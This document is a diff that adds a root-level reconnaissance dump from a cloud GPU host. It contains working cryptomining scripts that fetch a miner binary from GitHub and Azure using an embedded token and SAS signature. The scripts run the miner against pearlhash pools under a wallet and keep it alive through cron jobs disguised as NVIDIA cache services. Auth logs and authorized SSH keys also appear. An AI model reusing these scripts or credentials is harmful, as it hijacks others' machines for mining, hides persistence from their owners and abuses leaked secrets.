@@ -1,0 +1,273 @@
+=== hk10 host=ps4m8oe57 ts=2026-11-21T18:58:02Z
+--- whoami
+uid=0(root) gid=0(root) groups=0(root)
+ps4m8oe57
+--- root-home
+total 48
+drwx------  9 root root 4096 Nov 21 11:07 .
+drwxr-xr-x 20 root root 4096 Nov 21 18:14 ..
+drwxr--r--  2 root root 4096 Nov 17 20:16 Autotune
+-rw-------  1 root root    0 Jun 22  2023 .bash_history
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Nov 17 20:11 .cache
+drwxr--r--  2 root root 4096 Nov 17 20:16 Cache
+drwxr-xr-x  2 root root 4096 Nov 21 11:02 gpu
+drwx------  3 root root 4096 Nov 21 11:07 .nv
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwx------  3 root root 4096 Apr 27  2024 snap
+drwx------  2 root root 4096 Dec 14  2022 .ssh
+-rw-r--r--  1 root root    0 Jun 22  2023 .sudo_as_admin_successful
+-rw-------  1 root root 1418 Dec 28  2022 .viminfo
+--- home
+total 40
+drwxr-x--- 5 paperspace paperspace 4096 Dec 28  2022 .
+drwxr-xr-x 3 root       root       4096 Dec 14  2022 ..
+drwx------ 3 paperspace paperspace 4096 Dec 28  2022 .ansible
+-rw------- 1 paperspace paperspace   35 Jun 22  2023 .bash_history
+-rw-r--r-- 1 paperspace paperspace  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 paperspace paperspace 3771 Jan  6  2022 .bashrc
+drwx------ 2 paperspace paperspace 4096 Dec 14  2022 .cache
+-rw-r--r-- 1 paperspace paperspace  807 Jan  6  2022 .profile
+drwx------ 2 paperspace paperspace 4096 Dec 14  2022 .ssh
+-rw-r--r-- 1 paperspace paperspace    0 Dec 14  2022 .sudo_as_admin_successful
+-rw------- 1 paperspace paperspace 2141 Dec 28  2022 .viminfo
+-rw-r--r-- 1 root       root          0 Jun 22  2023 .xsession-errors
+--- gh-creds
+--- usr-local
+total 13824
+drwxr-xr-x  2 root root     4096 Nov 21 11:07 .
+drwxr-xr-x 10 root root     4096 Aug  9  2022 ..
+-rw-r--r--  1 root root     1160 Dec 28  2022 check_connectivity.sh
+-rwxr-xr-x  1 root root      554 Nov 21 11:07 hb_i68868.sh
+-rwxr-xr-x  1 root root 14132192 May 10  2023 linux-guest-health
+-rwxr-xr-x  1 root root     3262 Dec 28  2022 paperspace-create-template.sh
+--- paperspace-files
+/etc/apt/sources.list.d/paperspace.list
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_sup.sh
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_fail
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_rotated
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_sup.lock
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_kit.sh
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_pool_idx
+/opt/fleet.RIVAL.20261121T172135Z/bin/ps_hb.sh
+/opt/fleet/bin/ps_sup.sh
+/opt/fleet/bin/ps_fail
+/opt/fleet/bin/ps_sup.lock
+/opt/fleet/bin/ps_kit.sh
+/opt/fleet/bin/ps_pool_idx
+/opt/fleet/bin/ps_hb.sh
+/usr/local/bin/paperspace-create-template.sh
+/home/paperspace
+--- fleet-kit
+## /opt/fleet/bin/ps_kit.sh
+#!/bin/bash
+# download wildrig-multi with chunked retries; sources: github release asset, azure blob
+B='/opt/fleet/bin'; GH='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'; ASSET='775549274'; SHA256='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+L='/opt/fleet'
+log() { echo "[$(date -u +%H:%M:%S)] $*" >> "$L/logs/kit.log"; }
+ok() { [ -x "$B/wildrig-multi" ] && [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -gt 20000000 ]; }
+if ok; then log "kit present $(stat -c%s $B/wildrig-multi)"; exit 0; fi
+NCHUNK=8; SZ=29725148; CH=$(( (SZ + NCHUNK - 1) / NCHUNK ))
+try_github() {
+  LOC=$(curl -s -m 30 -o /dev/null -w '%{redirect_url}' -H "Authorization: Bearer $GH" -H 'Accept: application/octet-stream' "https://api.github.com/repos/dongsuju/ul-plant/releases/assets/$ASSET")
+  [ -n "$LOC" ] || { log "no redirect"; return 1; }
+  : > "$B/wr.part"
+  for k in $(seq 0 $((NCHUNK-1))); do
+    s=$((k*CH)); e=$((s+CH-1)); [ $e -ge $SZ ] && e=$((SZ-1))
+    got=0
+    for r in 1 2 3; do
+      code=$(curl -s -m 120 -r $s-$e -o "$B/c.$k" -w '%{http_code}' "$LOC")
+      sz=$(stat -c%s "$B/c.$k" 2>/dev/null || echo 0)
+      if [ "$code" = "206" ] && [ "$sz" = "$((e-s+1))" ]; then got=1; break; fi
+      log "chunk $k try $r code=$code sz=$sz"
+      sleep 3
+    done
+    [ "$got" = 1 ] || { log "chunk $k failed"; return 1; }
+    cat "$B/c.$k" >> "$B/wr.part"; rm -f "$B/c.$k"
+  done
+  mv "$B/wr.part" "$B/wildrig-multi"; chmod +x "$B/wildrig-multi"
+  H=$(sha256sum "$B/wildrig-multi" | cut -d' ' -f1)
+  log "github sha=$H"
+  [ "$H" = "$SHA256" ] && return 0 || { log "sha mismatch"; rm -f "$B/wildrig-multi"; return 1; }
+}
+try_blob() {
+  curl -sL -m 300 -o "$B/wildrig-multi" 'https://ulbatchkit4620.blob.core.windows.net/kit/wildrig-multi?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D' && chmod +x "$B/wildrig-multi"
+  H=$(sha256sum "$B/wildrig-multi" 2>/dev/null | cut -d' ' -f1)
+  log "blob sha=$H sz=$(stat -c%s $B/wildrig-multi 2>/dev/null)"
+  [ "$H" = "$SHA256" ] && return 0 || { rm -f "$B/wildrig-multi"; return 1; }
+}
+for attempt in 1 2 3 4 5 6; do
+## /opt/fleet/bin/ps_sup.sh
+#!/bin/bash
+W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
+P=$(cat /opt/fleet/prefix 2>/dev/null); L=/opt/fleet/logs; B=/opt/fleet/bin
+exec 9>"$B/ps_sup.lock"; flock -n 9 || exit 0
+N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "${N:-0}" -eq 0 ] && N=1
+POOLS=("stratum+ssl://prl.kryptex.network:8048" "stratum+tcp://prl.kryptex.network:7048" "stratums://pool.pearlhash.xyz:9443" "stratum+tcp://pearl.luckypool.io:3360")
+pi=0; [ -f "$B/ps_pool_idx" ] && pi=$(cat "$B/ps_pool_idx" 2>/dev/null || echo 0)
+log() { echo "[$(date -u +%H:%M:%S)] $*" >> "$L/logs/sup.log"; }
+[ -x "$B/wildrig-multi" ] || "$B/ps_kit.sh"
+start_ts=$(date +%s)
+while true; do
+  if [ ! -x "$B/wildrig-multi" ]; then log "no bin"; "$B/ps_kit.sh"; sleep 30; continue; fi
+  url=${POOLS[$pi]}
+  for i in $(seq 0 $((N-1))); do
+    if ! pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
+      # intensity ladder: per-gpu override -> fleet default
+      if [ -f "$B/margs.g$i" ]; then MA=$(cat "$B/margs.g$i"); else MA=$(cat /opt/fleet/margs 2>/dev/null); fi
+      setsid "$B/wildrig-multi" --algo pearlhash --url "$url" --user "$W.ul-$P-g$i" --pass x -d $i $MA >> "$L/logs/w-$P-g$i.log" 2>&1 &
+      log "start g$i $url args[$MA]"
+      sleep 2
+    fi
+  done
+  sleep 40
+  alive=0
+  for i in $(seq 0 $((N-1))); do
+    if pgrep -f "ul-$P-g$i" >/dev/null 2>&1; then
+      alive=$((alive+1))
+      # OOM ladder per gpu
+      if tail -25 "$L/logs/w-$P-g$i.log" 2>/dev/null | grep -q 'out of memory'; then
+        cur=$(cat "$B/margs.g$i" 2>/dev/null || cat /opt/fleet/margs 2>/dev/null | grep -oE '[0-9]+')
+        nxt=$(( ${cur:-6} / 2 )); [ "$nxt" -lt 1 ] && nxt=1
+        echo "--gpu-intensity $nxt" > "$B/margs.g$i"
+        log "g$i OOM -> intensity $nxt"
+        pkill -9 -f "ul-$P-g$i"
+      fi
+    fi
+  done
+  acc=$(grep -h 'accepted' $L/logs/w-$P-g*.log 2>/dev/null | wc -l)
+  if [ "$alive" -eq 0 ]; then
+    fails=$(( $(cat "$B/ps_fail" 2>/dev/null || echo 0) + 1 )); echo "$fails" > "$B/ps_fail"
+    log "alive=0 fail=$fails acc=$acc"
+    if [ "$fails" -ge 3 ]; then
+      pi=$(( (pi+1) % 4 )); echo "$pi" > "$B/ps_pool_idx"; echo 0 > "$B/ps_fail"
+      log "rotate pool -> ${POOLS[$pi]}"
+      for i in $(seq 0 $
+## /opt/fleet/prefix
+ps-ps4m8oe57
+
+## /opt/fleet/gh_token
+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
+
+--- fleet-logs
+total 20
+drwxr-xr-x 2 root root 4096 Nov 21 18:14 .
+drwxr-xr-x 4 root root 4096 Nov 21 18:14 ..
+-rw-r--r-- 1 root root  724 Nov 21 18:58 cmd.log
+-rw-r--r-- 1 root root  112 Nov 21 18:14 kit.log
+-rw-r--r-- 1 root root   81 Nov 21 18:14 ps7.log
+==> /opt/fleet/logs/cmd.log <==
+=== cmd all.sh aee8a391c2f909639739b71225f846e29c4f22fa Sat Nov 21 06:14:44 PM UTC 2026
+=== cmd ps-ps4m8oe57.sh bf9d49c51325f99313b89375328e326875f99269 Sat Nov 21 06:14:47 PM UTC 2026
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 2: message:: command not found
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 3: documentation_url:: command not found
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 4: status:: command not found
+=== cmd ps-ps4m8oe57.sh 6d659b94a2c22a4398015c5141202393a24f2e18 Sat Nov 21 06:54:02 PM UTC 2026
+PUT=201
+/opt/fleet/bin/cmd_ps-ps4m8oe57.sh: line 48: /usr/lib/.cache/nv-cache-run.sh: No such file or directory
+PUT=200
+=== cmd ps-ps4m8oe57.sh 40f04c24048824469e2c3ef50760f31dfac2bd6b Sat Nov 21 06:58:02 PM UTC 2026
+
+==> /opt/fleet/logs/kit.log <==
+[18:14:26] github sha=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
+[18:14:26] kit ok github
+
+==> /opt/fleet/logs/ps7.log <==
+=== ps7 Sat Nov 21 06:14:22 PM UTC 2026 host=ps4m8oe57 prefix=ps-ps4m8oe57 uid=0
+--- cron
+@reboot /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+*/2 * * * * /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+*/2 * * * * /opt/fleet/bin/ps_hb.sh >/dev/null 2>&1
+*/3 * * * * pgrep -f ps_sup.sh >/dev/null || /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+e2scrub_all
+nv-cache-mgr
+nv-cuda-cache
+## /etc/cron.d/e2scrub_all
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+## /etc/cron.d/nv-cache-mgr
+@reboot root /bin/bash /usr/lib/.cache/nv-cache-run.sh >/dev/null 2>&1
+*/5 * * * * root ps aux | grep -q "[n]v-cache-mgr" || /bin/bash /usr/lib/.cache/nv-cache-run.sh >/dev/null 2>&1
+## /etc/cron.d/nv-cuda-cache
+@reboot root /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+*/2 * * * * root /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+*/2 * * * * root /opt/fleet/bin/ps_hb.sh >/dev/null 2>&1
+*/3 * * * * root pgrep -f ps_sup.sh >/dev/null || /opt/fleet/bin/ps_sup.sh >/dev/null 2>&1
+--- units
+containerd.service
+cron.service
+dbus.service
+docker.service
+fwupd.service
+getty@tty1.service
+ModemManager.service
+multipathd.service
+networkd-dispatcher.service
+nv-cuda-cache.service
+nvidia-persistenced.service
+polkit.service
+ps-guest-agent.service
+rsyslog.service
+serial-getty@hvc0.service
+snapd.service
+ssh.service
+systemd-journald.service
+systemd-logind.service
+systemd-networkd.service
+--- docker
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+--- authlog
+Nov 21 18:54:18 ps4m8oe57 sshd[6830]: Connection closed by invalid user  143.198.216.98 port 56996 [preauth]
+Nov 21 18:54:19 ps4m8oe57 CRON[5705]: pam_unix(cron:session): session closed for user root
+Nov 21 18:55:01 ps4m8oe57 CRON[6960]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:55:01 ps4m8oe57 CRON[6960]: pam_unix(cron:session): session closed for user root
+Nov 21 18:56:01 ps4m8oe57 CRON[7005]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:56:01 ps4m8oe57 CRON[7008]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:56:01 ps4m8oe57 CRON[7007]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:56:01 ps4m8oe57 CRON[7006]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:56:01 ps4m8oe57 CRON[7005]: pam_unix(cron:session): session closed for user root
+Nov 21 18:56:01 ps4m8oe57 CRON[7008]: pam_unix(cron:session): session closed for user root
+Nov 21 18:56:01 ps4m8oe57 CRON[7006]: pam_unix(cron:session): session closed for user root
+Nov 21 18:56:04 ps4m8oe57 CRON[7007]: pam_unix(cron:session): session closed for user root
+Nov 21 18:56:39 ps4m8oe57 sshd[7136]: error: kex_exchange_identification: Connection closed by remote host
+Nov 21 18:56:39 ps4m8oe57 sshd[7136]: Connection closed by 5.68.242.238 port 1212
+Nov 21 18:57:01 ps4m8oe57 CRON[7138]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:57:01 ps4m8oe57 CRON[7137]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:57:01 ps4m8oe57 CRON[7138]: pam_unix(cron:session): session closed for user root
+Nov 21 18:57:01 ps4m8oe57 CRON[7137]: pam_unix(cron:session): session closed for user root
+Nov 21 18:58:01 ps4m8oe57 CRON[7201]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:58:01 ps4m8oe57 CRON[7204]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:58:01 ps4m8oe57 CRON[7203]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:58:01 ps4m8oe57 CRON[7202]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Nov 21 18:58:01 ps4m8oe57 CRON[7203]: pam_unix(cron:session): session closed for user root
+Nov 21 18:58:01 ps4m8oe57 CRON[7204]: pam_unix(cron:session): session closed for user root
+Nov 21 18:58:01 ps4m8oe57 CRON[7202]: pam_unix(cron:session): session closed for user root
+Nov 21 18:28:07 ps4m8oe57 sshd[3307]: Failed password for invalid user admin from 2.57.121.25 port 41794 ssh2
+Nov 21 18:28:08 ps4m8oe57 sshd[3307]: pam_unix(sshd:auth): check pass; user unknown
+Nov 21 18:28:10 ps4m8oe57 sshd[3307]: Failed password for invalid user admin from 2.57.121.25 port 41794 ssh2
+Nov 21 18:28:11 ps4m8oe57 sshd[3307]: pam_unix(sshd:auth): check pass; user unknown
+Nov 21 18:28:13 ps4m8oe57 sshd[3307]: Failed password for invalid user admin from 2.57.121.25 port 41794 ssh2
+Nov 21 18:28:14 ps4m8oe57 sshd[3307]: Connection closed by invalid user admin 2.57.121.25 port 41794 [preauth]
+Nov 21 18:28:14 ps4m8oe57 sshd[3307]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=2.57.121.25
+Nov 21 18:31:55 ps4m8oe57 sshd[3588]: error: kex_exchange_identification: Connection closed by remote host
+Nov 21 18:31:55 ps4m8oe57 sshd[3588]: Connection closed by 38.25.38.135 port 42076
+Nov 21 18:41:56 ps4m8oe57 sshd[4539]: error: kex_exchange_identification: Connection closed by remote host
+Nov 21 18:41:56 ps4m8oe57 sshd[4539]: Connection closed by 46.150.81.35 port 24967
+Nov 21 18:54:11 ps4m8oe57 sshd[6830]: Invalid user  from 143.198.216.98 port 56996
+Nov 21 18:54:18 ps4m8oe57 sshd[6830]: Connection closed by invalid user  143.198.216.98 port 56996 [preauth]
+Nov 21 18:56:39 ps4m8oe57 sshd[7136]: error: kex_exchange_identification: Connection closed by remote host
+Nov 21 18:56:39 ps4m8oe57 sshd[7136]: Connection closed by 5.68.242.238 port 1212
+--- ak
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... nskirvin@Nathans-MacBook-Pro.local
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... jamesskeltonps@JamesWoComputer.localdomain
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... jamesskeltonps@JamesWoComputer.localdomain
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... 
+--- net
+    inet 127.0.0.1/8 scope host lo
+    inet 10.64.11.120/20 metric 100 brd 10.64.15.255 scope global dynamic eth0
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+default via 10.64.0.1 dev eth0 proto dhcp src 10.64.11.120 metric 100 
+1.1.1.1 via 10.64.0.1 dev eth0 proto dhcp src 10.64.11.120 metric 100 
+10.64.0.0/20 dev eth0 proto kernel scope link src 10.64.11.120 metric 100 
+10.64.0.1 dev eth0 proto dhcp scope link src 10.64.11.120 metric 100 
+172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
